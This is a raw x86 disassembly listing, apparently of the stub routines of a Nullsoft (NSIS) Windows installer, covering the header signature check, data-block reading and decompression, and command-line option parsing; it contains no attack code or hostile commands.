  402bbd:	be 13 01 00 00       	mov    $0x113,%esi
  402bc2:	75 1b                	jne    0x402bdf
  402bc4:	6a 00                	push   $0x0
  402bc6:	68 fa 00 00 00       	push   $0xfa
  402bcb:	6a 01                	push   $0x1
  402bcd:	57                   	push   %edi
  402bce:	ff 15 e4 71 40 00    	call   *0x4071e4
  402bd4:	8b 45 14             	mov    0x14(%ebp),%eax
  402bd7:	89 75 0c             	mov    %esi,0xc(%ebp)
  402bda:	a3 28 b0 40 00       	mov    %eax,0x40b028
  402bdf:	39 75 0c             	cmp    %esi,0xc(%ebp)
  402be2:	75 4e                	jne    0x402c32
  402be4:	8b 0d 30 4c 41 00    	mov    0x414c30,%ecx
  402bea:	a1 38 8c 42 00       	mov    0x428c38,%eax
  402bef:	3b c8                	cmp    %eax,%ecx
  402bf1:	7c 02                	jl     0x402bf5
  402bf3:	8b c8                	mov    %eax,%ecx
  402bf5:	50                   	push   %eax
  402bf6:	6a 64                	push   $0x64
  402bf8:	51                   	push   %ecx
  402bf9:	ff 15 28 71 40 00    	call   *0x407128
  402bff:	50                   	push   %eax
  402c00:	be f0 4b 41 00       	mov    $0x414bf0,%esi
  402c05:	ff 35 28 b0 40 00    	push   0x40b028
  402c0b:	56                   	push   %esi
  402c0c:	ff 15 54 72 40 00    	call   *0x407254
  402c12:	83 c4 0c             	add    $0xc,%esp
  402c15:	56                   	push   %esi
  402c16:	57                   	push   %edi
  402c17:	ff 15 e8 71 40 00    	call   *0x4071e8
  402c1d:	56                   	push   %esi
  402c1e:	68 06 04 00 00       	push   $0x406
  402c23:	57                   	push   %edi
  402c24:	e8 4f 26 00 00       	call   0x405278
  402c29:	6a 05                	push   $0x5
  402c2b:	57                   	push   %edi
  402c2c:	ff 15 f4 71 40 00    	call   *0x4071f4
  402c32:	5f                   	pop    %edi
  402c33:	33 c0                	xor    %eax,%eax
  402c35:	5e                   	pop    %esi
  402c36:	5d                   	pop    %ebp
  402c37:	c2 10 00             	ret    $0x10
  402c3a:	55                   	push   %ebp
  402c3b:	8b ec                	mov    %esp,%ebp
  402c3d:	83 ec 2c             	sub    $0x2c,%esp
  402c40:	53                   	push   %ebx
  402c41:	56                   	push   %esi
  402c42:	33 db                	xor    %ebx,%ebx
  402c44:	57                   	push   %edi
  402c45:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  402c48:	ff 15 98 70 40 00    	call   *0x407098
  402c4e:	be 00 5c 43 00       	mov    $0x435c00,%esi
  402c53:	68 00 04 00 00       	push   $0x400
  402c58:	8b f8                	mov    %eax,%edi
  402c5a:	56                   	push   %esi
  402c5b:	53                   	push   %ebx
  402c5c:	81 c7 e8 03 00 00    	add    $0x3e8,%edi
  402c62:	89 5d f4             	mov    %ebx,-0xc(%ebp)
  402c65:	89 5d f8             	mov    %ebx,-0x8(%ebp)
  402c68:	ff 15 94 70 40 00    	call   *0x407094
  402c6e:	6a 03                	push   $0x3
  402c70:	68 00 00 00 80       	push   $0x80000000
  402c75:	56                   	push   %esi
  402c76:	e8 05 2a 00 00       	call   0x405680
  402c7b:	8b d8                	mov    %eax,%ebx
  402c7d:	83 fb ff             	cmp    $0xffffffff,%ebx
  402c80:	89 5d f0             	mov    %ebx,-0x10(%ebp)
  402c83:	89 1d 20 90 40 00    	mov    %ebx,0x409020
  402c89:	75 0a                	jne    0x402c95
  402c8b:	b8 78 91 40 00       	mov    $0x409178,%eax
  402c90:	e9 18 02 00 00       	jmp    0x402ead
  402c95:	56                   	push   %esi
  402c96:	e8 49 28 00 00       	call   0x4054e4
  402c9b:	6a 00                	push   $0x0
  402c9d:	53                   	push   %ebx
  402c9e:	ff 15 90 70 40 00    	call   *0x407090
  402ca4:	85 c0                	test   %eax,%eax
  402ca6:	a3 38 8c 42 00       	mov    %eax,0x428c38
  402cab:	8b f0                	mov    %eax,%esi
  402cad:	0f 8e 3c 01 00 00    	jle    0x402def
  402cb3:	a1 2c f0 42 00       	mov    0x42f02c,%eax
  402cb8:	8b de                	mov    %esi,%ebx
  402cba:	f7 d8                	neg    %eax
  402cbc:	1b c0                	sbb    %eax,%eax
  402cbe:	25 00 7e 00 00       	and    $0x7e00,%eax
  402cc3:	05 00 02 00 00       	add    $0x200,%eax
  402cc8:	3b f0                	cmp    %eax,%esi
  402cca:	7c 02                	jl     0x402cce
  402ccc:	8b d8                	mov    %eax,%ebx
  402cce:	53                   	push   %ebx
  402ccf:	68 38 0c 42 00       	push   $0x420c38
  402cd4:	e8 07 04 00 00       	call   0x4030e0
  402cd9:	85 c0                	test   %eax,%eax
  402cdb:	0f 84 72 01 00 00    	je     0x402e53
  402ce1:	33 c0                	xor    %eax,%eax
  402ce3:	39 05 2c f0 42 00    	cmp    %eax,0x42f02c
  402ce9:	0f 85 8e 00 00 00    	jne    0x402d7d
  402cef:	6a 1c                	push   $0x1c
  402cf1:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  402cf4:	68 38 0c 42 00       	push   $0x420c38
  402cf9:	50                   	push   %eax
  402cfa:	e8 42 29 00 00       	call   0x405641
  402cff:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  402d02:	a9 f0 ff ff ff       	test   $0xfffffff0,%eax
  402d07:	0f 85 aa 00 00 00    	jne    0x402db7
  402d0d:	81 7d d8 ef be ad de 	cmpl   $0xdeadbeef,-0x28(%ebp)
  402d14:	0f 85 9d 00 00 00    	jne    0x402db7
  402d1a:	81 7d e4 49 6e 73 74 	cmpl   $0x74736e49,-0x1c(%ebp)
  402d21:	0f 85 90 00 00 00    	jne    0x402db7
  402d27:	81 7d e0 73 6f 66 74 	cmpl   $0x74666f73,-0x20(%ebp)
  402d2e:	0f 85 83 00 00 00    	jne    0x402db7
  402d34:	81 7d dc 4e 75 6c 6c 	cmpl   $0x6c6c754e,-0x24(%ebp)
  402d3b:	75 7a                	jne    0x402db7
  402d3d:	09 45 08             	or     %eax,0x8(%ebp)
  402d40:	8b 45 08             	mov    0x8(%ebp),%eax
  402d43:	8b 0d 30 4c 41 00    	mov    0x414c30,%ecx
  402d49:	83 e0 02             	and    $0x2,%eax
  402d4c:	09 05 c0 f0 42 00    	or     %eax,0x42f0c0
  402d52:	8b 45 ec             	mov    -0x14(%ebp),%eax
  402d55:	3b c6                	cmp    %esi,%eax
  402d57:	89 0d 2c f0 42 00    	mov    %ecx,0x42f02c
  402d5d:	0f 8f e9 00 00 00    	jg     0x402e4c
  402d63:	f6 45 08 08          	testb  $0x8,0x8(%ebp)
  402d67:	75 06                	jne    0x402d6f
  402d69:	f6 45 08 04          	testb  $0x4,0x8(%ebp)
  402d6d:	75 71                	jne    0x402de0
  402d6f:	ff 45 f8             	incl   -0x8(%ebp)
  402d72:	8d 70 fc             	lea    -0x4(%eax),%esi
  402d75:	3b de                	cmp    %esi,%ebx
  402d77:	76 3e                	jbe    0x402db7
  402d79:	8b de                	mov    %esi,%ebx
  402d7b:	eb 3a                	jmp    0x402db7
  402d7d:	f6 45 08 02          	testb  $0x2,0x8(%ebp)
  402d81:	75 34                	jne    0x402db7
  402d83:	39 45 fc             	cmp    %eax,-0x4(%ebp)
  402d86:	74 08                	je     0x402d90
  402d88:	50                   	push   %eax
  402d89:	e8 46 2f 00 00       	call   0x405cd4
  402d8e:	eb 27                	jmp    0x402db7
  402d90:	ff 15 98 70 40 00    	call   *0x407098
  402d96:	3b c7                	cmp    %edi,%eax
  402d98:	76 1d                	jbe    0x402db7
  402d9a:	68 5c 91 40 00       	push   $0x40915c
  402d9f:	68 ae 2b 40 00       	push   $0x402bae
  402da4:	6a 00                	push   $0x0
  402da6:	6a 6f                	push   $0x6f
  402da8:	ff 35 20 f0 42 00    	push   0x42f020
  402dae:	ff 15 dc 71 40 00    	call   *0x4071dc
  402db4:	89 45 fc             	mov    %eax,-0x4(%ebp)
  402db7:	3b 35 38 8c 42 00    	cmp    0x428c38,%esi
  402dbd:	7d 11                	jge    0x402dd0
  402dbf:	53                   	push   %ebx
  402dc0:	68 38 0c 42 00       	push   $0x420c38
  402dc5:	ff 75 f4             	push   -0xc(%ebp)
  402dc8:	e8 3a 2f 00 00       	call   0x405d07
  402dcd:	89 45 f4             	mov    %eax,-0xc(%ebp)
  402dd0:	01 1d 30 4c 41 00    	add    %ebx,0x414c30
  402dd6:	2b f3                	sub    %ebx,%esi
  402dd8:	85 f6                	test   %esi,%esi
  402dda:	0f 8f d3 fe ff ff    	jg     0x402cb3
  402de0:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  402de4:	74 09                	je     0x402def
  402de6:	ff 75 fc             	push   -0x4(%ebp)
  402de9:	ff 15 e0 71 40 00    	call   *0x4071e0
  402def:	33 ff                	xor    %edi,%edi
  402df1:	39 3d 2c f0 42 00    	cmp    %edi,0x42f02c
  402df7:	74 53                	je     0x402e4c
  402df9:	39 7d f8             	cmp    %edi,-0x8(%ebp)
  402dfc:	74 22                	je     0x402e20
  402dfe:	ff 35 30 4c 41 00    	push   0x414c30
  402e04:	e8 09 03 00 00       	call   0x403112
  402e09:	8d 45 08             	lea    0x8(%ebp),%eax
  402e0c:	6a 04                	push   $0x4
  402e0e:	50                   	push   %eax
  402e0f:	e8 cc 02 00 00       	call   0x4030e0
  402e14:	85 c0                	test   %eax,%eax
  402e16:	74 34                	je     0x402e4c
  402e18:	8b 45 f4             	mov    -0xc(%ebp),%eax
  402e1b:	3b 45 08             	cmp    0x8(%ebp),%eax
  402e1e:	75 2c                	jne    0x402e4c
  402e20:	ff 75 e8             	push   -0x18(%ebp)
  402e23:	6a 40                	push   $0x40
  402e25:	ff 15 f8 70 40 00    	call   *0x4070f8
  402e2b:	8b f0                	mov    %eax,%esi
  402e2d:	a1 2c f0 42 00       	mov    0x42f02c,%eax
  402e32:	83 c0 1c             	add    $0x1c,%eax
  402e35:	50                   	push   %eax
  402e36:	e8 d7 02 00 00       	call   0x403112
  402e3b:	ff 75 e8             	push   -0x18(%ebp)
  402e3e:	56                   	push   %esi
  402e3f:	57                   	push   %edi
  402e40:	6a ff                	push   $0xffffffff
  402e42:	e8 6d 00 00 00       	call   0x402eb4
  402e47:	3b 45 e8             	cmp    -0x18(%ebp),%eax
  402e4a:	74 18                	je     0x402e64
  402e4c:	b8 28 90 40 00       	mov    $0x409028,%eax
  402e51:	eb 5a                	jmp    0x402ead
  402e53:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  402e57:	74 f3                	je     0x402e4c
  402e59:	ff 75 fc             	push   -0x4(%ebp)
  402e5c:	ff 15 e0 71 40 00    	call   *0x4071e0
  402e62:	eb e8                	jmp    0x402e4c
  402e64:	f6 45 d4 01          	testb  $0x1,-0x2c(%ebp)
  402e68:	89 35 28 f0 42 00    	mov    %esi,0x42f028
  402e6e:	8b 06                	mov    (%esi),%eax
  402e70:	a3 30 f0 42 00       	mov    %eax,0x42f030
  402e75:	74 06                	je     0x402e7d
  402e77:	ff 05 34 f0 42 00    	incl   0x42f034
  402e7d:	6a 08                	push   $0x8
  402e7f:	8d 46 44             	lea    0x44(%esi),%eax
  402e82:	59                   	pop    %ecx
  402e83:	83 e8 08             	sub    $0x8,%eax
  402e86:	01 30                	add    %esi,(%eax)
  402e88:	49                   	dec    %ecx
  402e89:	75 f8                	jne    0x402e83
  402e8b:	6a 01                	push   $0x1
  402e8d:	57                   	push   %edi
  402e8e:	57                   	push   %edi
  402e8f:	ff 75 f0             	push   -0x10(%ebp)
  402e92:	ff 15 30 71 40 00    	call   *0x407130
  402e98:	89 46 3c             	mov    %eax,0x3c(%esi)
  402e9b:	83 c6 04             	add    $0x4,%esi
  402e9e:	6a 40                	push   $0x40
  402ea0:	56                   	push   %esi
  402ea1:	68 40 f0 42 00       	push   $0x42f040
  402ea6:	e8 96 27 00 00       	call   0x405641
  402eab:	33 c0                	xor    %eax,%eax
  402ead:	5f                   	pop    %edi
  402eae:	5e                   	pop    %esi
  402eaf:	5b                   	pop    %ebx
  402eb0:	c9                   	leave
  402eb1:	c2 04 00             	ret    $0x4
  402eb4:	55                   	push   %ebp
  402eb5:	8b ec                	mov    %esp,%ebp
  402eb7:	83 ec 58             	sub    $0x58,%esp
  402eba:	53                   	push   %ebx
  402ebb:	56                   	push   %esi
  402ebc:	8b 75 14             	mov    0x14(%ebp),%esi
  402ebf:	57                   	push   %edi
  402ec0:	8b 7d 10             	mov    0x10(%ebp),%edi
  402ec3:	89 75 f8             	mov    %esi,-0x8(%ebp)
  402ec6:	85 ff                	test   %edi,%edi
  402ec8:	75 07                	jne    0x402ed1
  402eca:	c7 45 f8 00 80 00 00 	movl   $0x8000,-0x8(%ebp)
  402ed1:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  402ed5:	89 7d f4             	mov    %edi,-0xc(%ebp)
  402ed8:	85 ff                	test   %edi,%edi
  402eda:	75 07                	jne    0x402ee3
  402edc:	c7 45 f4 38 8c 41 00 	movl   $0x418c38,-0xc(%ebp)
  402ee3:	8b 45 08             	mov    0x8(%ebp),%eax
  402ee6:	85 c0                	test   %eax,%eax
  402ee8:	7c 0e                	jl     0x402ef8
  402eea:	8b 0d 78 f0 42 00    	mov    0x42f078,%ecx
  402ef0:	03 c8                	add    %eax,%ecx
  402ef2:	51                   	push   %ecx
  402ef3:	e8 1a 02 00 00       	call   0x403112
  402ef8:	8d 45 14             	lea    0x14(%ebp),%eax
  402efb:	6a 04                	push   $0x4
  402efd:	50                   	push   %eax
  402efe:	e8 dd 01 00 00       	call   0x4030e0
  402f03:	85 c0                	test   %eax,%eax
  402f05:	0f 84 80 01 00 00    	je     0x40308b
  402f0b:	f6 45 17 80          	testb  $0x80,0x17(%ebp)
  402f0f:	0f 84 5f 01 00 00    	je     0x403074
  402f15:	8b 1d 98 70 40 00    	mov    0x407098,%ebx
  402f1b:	ff d3                	call   *%ebx
  402f1d:	83 25 5c b5 40 00 00 	andl   $0x0,0x40b55c
  402f24:	83 25 58 b5 40 00 00 	andl   $0x0,0x40b558
  402f2b:	81 65 14 ff ff ff 7f 	andl   $0x7fffffff,0x14(%ebp)
  402f32:	89 45 f0             	mov    %eax,-0x10(%ebp)
  402f35:	b8 e0 cb 40 00       	mov    $0x40cbe0,%eax
  402f3a:	c7 05 40 b0 40 00 08 	movl   $0x8,0x40b040
  402f41:	00 00 00 
  402f44:	a3 e8 4b 41 00       	mov    %eax,0x414be8
  402f49:	a3 e4 4b 41 00       	mov    %eax,0x414be4
  402f4e:	8b 45 14             	mov    0x14(%ebp),%eax
  402f51:	c7 05 e0 4b 41 00 e0 	movl   $0x414be0,0x414be0
  402f58:	4b 41 00 
  402f5b:	89 45 08             	mov    %eax,0x8(%ebp)
  402f5e:	0f 8e 72 01 00 00    	jle    0x4030d6
  402f64:	be 00 40 00 00       	mov    $0x4000,%esi
  402f69:	39 75 14             	cmp    %esi,0x14(%ebp)
  402f6c:	7d 03                	jge    0x402f71
  402f6e:	8b 75 14             	mov    0x14(%ebp),%esi
  402f71:	bf 38 4c 41 00       	mov    $0x414c38,%edi
  402f76:	56                   	push   %esi
  402f77:	57                   	push   %edi
  402f78:	e8 63 01 00 00       	call   0x4030e0
  402f7d:	85 c0                	test   %eax,%eax
  402f7f:	0f 84 06 01 00 00    	je     0x40308b
  402f85:	29 75 14             	sub    %esi,0x14(%ebp)
  402f88:	89 3d 30 b0 40 00    	mov    %edi,0x40b030
  402f8e:	89 35 34 b0 40 00    	mov    %esi,0x40b034
  402f94:	8b 7d f4             	mov    -0xc(%ebp),%edi
  402f97:	8b 45 f8             	mov    -0x8(%ebp),%eax
  402f9a:	68 30 b0 40 00       	push   $0x40b030
  402f9f:	89 3d 38 b0 40 00    	mov    %edi,0x40b038
  402fa5:	a3 3c b0 40 00       	mov    %eax,0x40b03c
  402faa:	e8 c6 2d 00 00       	call   0x405d75
  402faf:	85 c0                	test   %eax,%eax
  402fb1:	89 45 e8             	mov    %eax,-0x18(%ebp)
  402fb4:	0f 8c b2 00 00 00    	jl     0x40306c
  402fba:	8b 35 38 b0 40 00    	mov    0x40b038,%esi
  402fc0:	2b f7                	sub    %edi,%esi
  402fc2:	ff d3                	call   *%ebx
  402fc4:	f6 05 8c 92 40 00 01 	testb  $0x1,0x40928c
  402fcb:	8b f8                	mov    %eax,%edi
  402fcd:	74 43                	je     0x403012
  402fcf:	2b 45 f0             	sub    -0x10(%ebp),%eax
  402fd2:	3d c8 00 00 00       	cmp    $0xc8,%eax
  402fd7:	77 06                	ja     0x402fdf
  402fd9:	83 7d 14 00          	cmpl   $0x0,0x14(%ebp)
  402fdd:	75 33                	jne    0x403012
  402fdf:	8b 45 08             	mov    0x8(%ebp),%eax
  402fe2:	ff 75 08             	push   0x8(%ebp)
  402fe5:	2b 45 14             	sub    0x14(%ebp),%eax
  402fe8:	6a 64                	push   $0x64
  402fea:	50                   	push   %eax
  402feb:	ff 15 28 71 40 00    	call   *0x407128
  402ff1:	50                   	push   %eax
  402ff2:	8d 45 a8             	lea    -0x58(%ebp),%eax
  402ff5:	68 94 91 40 00       	push   $0x409194
  402ffa:	50                   	push   %eax
  402ffb:	ff 15 54 72 40 00    	call   *0x407254
  403001:	83 c4 0c             	add    $0xc,%esp
  403004:	8d 45 a8             	lea    -0x58(%ebp),%eax
  403007:	50                   	push   %eax
  403008:	6a 00                	push   $0x0
  40300a:	e8 5a 1d 00 00       	call   0x404d69
  40300f:	89 7d f0             	mov    %edi,-0x10(%ebp)
  403012:	33 c0                	xor    %eax,%eax
  403014:	3b f0                	cmp    %eax,%esi
  403016:	74 49                	je     0x403061
  403018:	39 45 10             	cmp    %eax,0x10(%ebp)
  40301b:	75 20                	jne    0x40303d
  40301d:	50                   	push   %eax
  40301e:	8d 45 ec             	lea    -0x14(%ebp),%eax
  403021:	50                   	push   %eax
  403022:	56                   	push   %esi
  403023:	ff 75 f4             	push   -0xc(%ebp)
  403026:	ff 75 0c             	push   0xc(%ebp)
  403029:	ff 15 24 71 40 00    	call   *0x407124
  40302f:	85 c0                	test   %eax,%eax
  403031:	74 3d                	je     0x403070
  403033:	39 75 ec             	cmp    %esi,-0x14(%ebp)
  403036:	75 38                	jne    0x403070
  403038:	01 75 fc             	add    %esi,-0x4(%ebp)
  40303b:	eb 18                	jmp    0x403055
  40303d:	29 75 f8             	sub    %esi,-0x8(%ebp)
  403040:	01 75 fc             	add    %esi,-0x4(%ebp)
  403043:	a1 38 b0 40 00       	mov    0x40b038,%eax
  403048:	83 7d f8 01          	cmpl   $0x1,-0x8(%ebp)
  40304c:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40304f:	0f 8c 81 00 00 00    	jl     0x4030d6
  403055:	83 7d e8 01          	cmpl   $0x1,-0x18(%ebp)
  403059:	0f 85 35 ff ff ff    	jne    0x402f94
  40305f:	eb 75                	jmp    0x4030d6
  403061:	39 45 14             	cmp    %eax,0x14(%ebp)
  403064:	0f 8f fa fe ff ff    	jg     0x402f64
  40306a:	eb 6a                	jmp    0x4030d6
  40306c:	6a fc                	push   $0xfffffffc
  40306e:	eb 1d                	jmp    0x40308d
  403070:	6a fe                	push   $0xfffffffe
  403072:	eb 19                	jmp    0x40308d
  403074:	85 ff                	test   %edi,%edi
  403076:	74 53                	je     0x4030cb
  403078:	39 75 14             	cmp    %esi,0x14(%ebp)
  40307b:	7d 03                	jge    0x403080
  40307d:	8b 75 14             	mov    0x14(%ebp),%esi
  403080:	56                   	push   %esi
  403081:	57                   	push   %edi
  403082:	e8 59 00 00 00       	call   0x4030e0
  403087:	85 c0                	test   %eax,%eax
  403089:	75 48                	jne    0x4030d3
  40308b:	6a fd                	push   $0xfffffffd
  40308d:	58                   	pop    %eax
  40308e:	eb 49                	jmp    0x4030d9
  403090:	8b 75 f8             	mov    -0x8(%ebp),%esi
  403093:	39 75 14             	cmp    %esi,0x14(%ebp)
  403096:	7d 03                	jge    0x40309b
  403098:	8b 75 14             	mov    0x14(%ebp),%esi
  40309b:	bf 38 4c 41 00       	mov    $0x414c38,%edi
  4030a0:	56                   	push   %esi
  4030a1:	57                   	push   %edi
  4030a2:	e8 39 00 00 00       	call   0x4030e0
  4030a7:	85 c0                	test   %eax,%eax
  4030a9:	74 e0                	je     0x40308b
  4030ab:	8d 45 10             	lea    0x10(%ebp),%eax
  4030ae:	6a 00                	push   $0x0
  4030b0:	50                   	push   %eax
  4030b1:	56                   	push   %esi
  4030b2:	57                   	push   %edi
  4030b3:	ff 75 0c             	push   0xc(%ebp)
  4030b6:	ff 15 24 71 40 00    	call   *0x407124
  4030bc:	85 c0                	test   %eax,%eax
  4030be:	74 b0                	je     0x403070
  4030c0:	3b 75 10             	cmp    0x10(%ebp),%esi
  4030c3:	75 ab                	jne    0x403070
  4030c5:	01 75 fc             	add    %esi,-0x4(%ebp)
  4030c8:	29 75 14             	sub    %esi,0x14(%ebp)
  4030cb:	83 7d 14 00          	cmpl   $0x0,0x14(%ebp)
  4030cf:	7f bf                	jg     0x403090
  4030d1:	eb 03                	jmp    0x4030d6
  4030d3:	89 75 fc             	mov    %esi,-0x4(%ebp)
  4030d6:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4030d9:	5f                   	pop    %edi
  4030da:	5e                   	pop    %esi
  4030db:	5b                   	pop    %ebx
  4030dc:	c9                   	leave
  4030dd:	c2 10 00             	ret    $0x10
  4030e0:	55                   	push   %ebp
  4030e1:	8b ec                	mov    %esp,%ebp
  4030e3:	56                   	push   %esi
  4030e4:	8b 75 0c             	mov    0xc(%ebp),%esi
  4030e7:	8d 45 0c             	lea    0xc(%ebp),%eax
  4030ea:	6a 00                	push   $0x0
  4030ec:	50                   	push   %eax
  4030ed:	56                   	push   %esi
  4030ee:	ff 75 08             	push   0x8(%ebp)
  4030f1:	ff 35 20 90 40 00    	push   0x409020
  4030f7:	ff 15 2c 71 40 00    	call   *0x40712c
  4030fd:	85 c0                	test   %eax,%eax
  4030ff:	74 0a                	je     0x40310b
  403101:	39 75 0c             	cmp    %esi,0xc(%ebp)
  403104:	75 05                	jne    0x40310b
  403106:	33 c0                	xor    %eax,%eax
  403108:	40                   	inc    %eax
  403109:	eb 02                	jmp    0x40310d
  40310b:	33 c0                	xor    %eax,%eax
  40310d:	5e                   	pop    %esi
  40310e:	5d                   	pop    %ebp
  40310f:	c2 08 00             	ret    $0x8
  403112:	6a 00                	push   $0x0
  403114:	6a 00                	push   $0x0
  403116:	ff 74 24 0c          	push   0xc(%esp)
  40311a:	ff 35 20 90 40 00    	push   0x409020
  403120:	ff 15 30 71 40 00    	call   *0x407130
  403126:	c2 04 00             	ret    $0x4
  403129:	56                   	push   %esi
  40312a:	be 00 64 43 00       	mov    $0x436400,%esi
  40312f:	56                   	push   %esi
  403130:	e8 9e 2a 00 00       	call   0x405bd3
  403135:	56                   	push   %esi
  403136:	e8 ce 23 00 00       	call   0x405509
  40313b:	85 c0                	test   %eax,%eax
  40313d:	75 02                	jne    0x403141
  40313f:	5e                   	pop    %esi
  403140:	c3                   	ret
  403141:	56                   	push   %esi
  403142:	e8 56 23 00 00       	call   0x40549d
  403147:	6a 00                	push   $0x0
  403149:	56                   	push   %esi
  40314a:	ff 15 84 70 40 00    	call   *0x407084
  403150:	56                   	push   %esi
  403151:	68 00 60 43 00       	push   $0x436000
  403156:	e8 54 25 00 00       	call   0x4056af
  40315b:	5e                   	pop    %esi
  40315c:	c3                   	ret
  40315d:	55                   	push   %ebp
  40315e:	8b ec                	mov    %esp,%ebp
  403160:	81 ec 80 01 00 00    	sub    $0x180,%esp
  403166:	53                   	push   %ebx
  403167:	56                   	push   %esi
  403168:	33 db                	xor    %ebx,%ebx
  40316a:	57                   	push   %edi
  40316b:	89 5d f4             	mov    %ebx,-0xc(%ebp)
  40316e:	c7 45 f8 30 92 40 00 	movl   $0x409230,-0x8(%ebp)
  403175:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  403178:	c6 45 ec 20          	movb   $0x20,-0x14(%ebp)
  40317c:	ff 15 30 70 40 00    	call   *0x407030
  403182:	53                   	push   %ebx
  403183:	ff 15 70 72 40 00    	call   *0x407270
  403189:	a3 d0 f0 42 00       	mov    %eax,0x42f0d0
  40318e:	53                   	push   %ebx
  40318f:	8d 85 80 fe ff ff    	lea    -0x180(%ebp),%eax
  403195:	68 60 01 00 00       	push   $0x160
  40319a:	50                   	push   %eax
  40319b:	53                   	push   %ebx
  40319c:	68 40 94 42 00       	push   $0x429440
  4031a1:	ff 15 54 71 40 00    	call   *0x407154
  4031a7:	68 24 92 40 00       	push   $0x409224
  4031ac:	68 20 e8 42 00       	push   $0x42e820
  4031b1:	e8 ee 27 00 00       	call   0x4059a4
  4031b6:	ff 15 b0 70 40 00    	call   *0x4070b0
  4031bc:	be 00 50 43 00       	mov    $0x435000,%esi
  4031c1:	50                   	push   %eax
  4031c2:	56                   	push   %esi
  4031c3:	e8 dc 27 00 00       	call   0x4059a4
  4031c8:	53                   	push   %ebx
  4031c9:	ff 15 08 71 40 00    	call   *0x407108
  4031cf:	80 3d 00 50 43 00 22 	cmpb   $0x22,0x435000
  4031d6:	a3 20 f0 42 00       	mov    %eax,0x42f020
  4031db:	8b c6                	mov    %esi,%eax
  4031dd:	75 09                	jne    0x4031e8
  4031df:	c6 45 ec 22          	movb   $0x22,-0x14(%ebp)
  4031e3:	b8 01 50 43 00       	mov    $0x435001,%eax
  4031e8:	ff 75 ec             	push   -0x14(%ebp)
  4031eb:	50                   	push   %eax
  4031ec:	e8 d7 22 00 00       	call   0x4054c8
  4031f1:	50                   	push   %eax
  4031f2:	ff 15 10 72 40 00    	call   *0x407210
  4031f8:	89 45 f0             	mov    %eax,-0x10(%ebp)
  4031fb:	eb 62                	jmp    0x40325f
  4031fd:	80 f9 20             	cmp    $0x20,%cl
  403200:	75 06                	jne    0x403208
  403202:	40                   	inc    %eax
  403203:	80 38 20             	cmpb   $0x20,(%eax)
  403206:	74 fa                	je     0x403202
  403208:	80 38 22             	cmpb   $0x22,(%eax)
  40320b:	c6 45 ec 20          	movb   $0x20,-0x14(%ebp)
  40320f:	75 05                	jne    0x403216
  403211:	40                   	inc    %eax
  403212:	c6 45 ec 22          	movb   $0x22,-0x14(%ebp)
  403216:	80 38 2f             	cmpb   $0x2f,(%eax)
  403219:	75 35                	jne    0x403250
  40321b:	40                   	inc    %eax
  40321c:	80 38 53             	cmpb   $0x53,(%eax)
  40321f:	75 0f                	jne    0x403230
  403221:	8a 48 01             	mov    0x1(%eax),%cl
  403224:	80 c9 20             	or     $0x20,%cl
  403227:	80 f9 20             	cmp    $0x20,%cl
  40322a:	75 04                	jne    0x403230
  40322c:	83 4d fc 02          	orl    $0x2,-0x4(%ebp)
  403230:	81 38 4e 43 52 43    	cmpl   $0x4352434e,(%eax)
  403236:	75 0f                	jne    0x403247
  403238:	8a 48 04             	mov    0x4(%eax),%cl
  40323b:	80 c9 20             	or     $0x20,%cl
  40323e:	80 f9 20             	cmp    $0x20,%cl
  403241:	75 04                	jne    0x403247
  403243:	83 4d fc 04          	orl    $0x4,-0x4(%ebp)
  403247:	81 78 fe 20 2f 44 3d 	cmpl   $0x3d442f20,-0x2(%eax)
  40324e:	74 17                	je     0x403267
  403250:	ff 75 ec             	push   -0x14(%ebp)
  403253:	50                   	push   %eax
  403254:	e8 6f 22 00 00       	call   0x4054c8
  403259:	80 38 22             	cmpb   $0x22,(%eax)
  40325c:	75 01                	jne    0x40325f
  40325e:	40                   	inc    %eax
  40325f:	8a 08                	mov    (%eax),%cl
  403261:	3a cb                	cmp    %bl,%cl
  403263:	75 98                	jne    0x4031fd
  403265:	eb 11                	jmp    0x403278
  403267:	89 58 fe             	mov    %ebx,-0x2(%eax)
  40326a:	83 c0 02             	add    $0x2,%eax
  40326d:	50                   	push   %eax
  40326e:	68 00 54 43 00       	push   $0x435400
  403273:	e8 2c 27 00 00       	call   0x4059a4
  403278:	bf 00 64 43 00       	mov    $0x436400,%edi
  40327d:	57                   	push   %edi
  40327e:	68 00 04 00 00       	push   $0x400
  403283:	ff 15 ac 70 40 00    	call   *0x4070ac
  403289:	e8 9b fe ff ff       	call   0x403129
  40328e:	85 c0                	test   %eax,%eax
  403290:	75 20                	jne    0x4032b2
  403292:	68 fb 03 00 00       	push   $0x3fb
  403297:	57                   	push   %edi
  403298:	ff 15 a8 70 40 00    	call   *0x4070a8
  40329e:	68 1c 92 40 00       	push   $0x40921c
  4032a3:	57                   	push   %edi
  4032a4:	e8 17 27 00 00       	call   0x4059c0
  4032a9:	e8 7b fe ff ff       	call   0x403129
  4032ae:	85 c0                	test   %eax,%eax
  4032b0:	74 7c                	je     0x40332e
  4032b2:	68 00 60 43 00       	push   $0x436000
  4032b7:	ff 15 40 71 40 00    	call   *0x407140
  4032bd:	ff 75 fc             	push   -0x4(%ebp)
  4032c0:	e8 75 f9 ff ff       	call   0x402c3a
  4032c5:	3b c3                	cmp    %ebx,%eax
  4032c7:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4032ca:	75 62                	jne    0x40332e
  4032cc:	39 1d 34 f0 42 00    	cmp    %ebx,0x42f034
  4032d2:	74 4b                	je     0x40331f
  4032d4:	53                   	push   %ebx
  4032d5:	56                   	push   %esi
  4032d6:	e8 ed 21 00 00       	call   0x4054c8
  4032db:	8b f8                	mov    %eax,%edi
  4032dd:	eb 09                	jmp    0x4032e8
  4032df:	81 3f 20 5f 3f 3d    	cmpl   $0x3d3f5f20,(%edi)
  4032e5:	74 05                	je     0x4032ec
  4032e7:	4f                   	dec    %edi
  4032e8:	3b fe                	cmp    %esi,%edi
  4032ea:	73 f3                	jae    0x4032df
  4032ec:	3b fe                	cmp    %esi,%edi
  4032ee:	c7 45 f8 78 91 40 00 	movl   $0x409178,-0x8(%ebp)
  4032f5:	72 60                	jb     0x403357
